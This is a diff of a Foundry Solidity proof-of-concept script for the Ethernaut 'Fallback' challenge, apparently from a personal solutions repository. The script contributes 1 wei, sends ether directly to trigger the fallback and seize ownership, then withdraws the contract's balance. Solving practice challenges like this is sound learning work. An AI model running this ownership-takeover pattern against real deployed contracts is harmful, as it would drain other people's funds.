@@ -1,21 +1,23 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity 0.8.24;
 
-import "forge-std/Script.sol";
-import "../instances/Ilevel01.sol";
+import {Script} from "forge-std/Script.sol";
+import "../challenges/1_Fallback.sol";
 
 contract POC is Script {
-    Fallback level1 = Fallback(0xFEa5EC80853C53c7083F9027BE97130F3836D460);
+    Fallback fall =
+        Fallback(payable(0x28cF211dcAff31B4c90aA321E976311f7A09f9FA)); // Replace with your Fallback instance
 
     function run() external {
-        vm.startBroadcast();
+        uint256 deployer = vm.envUint("PRIVATE_KEY");
 
-        level1.contribute{value: 1 wei}();
-        level1.getContribution();
-        address(level1).call{value: 1 wei}("");
-        level1.owner();
-        level1.withdraw();
-        
+        vm.startBroadcast(deployer);
+
+        fall.contribute{value: 1 wei}();
+        (bool success, ) = address(fall).call{value: 1 wei}("");
+        require(success, "Failed to send ether");
+        fall.withdraw();
+
         vm.stopBroadcast();
     }
 }
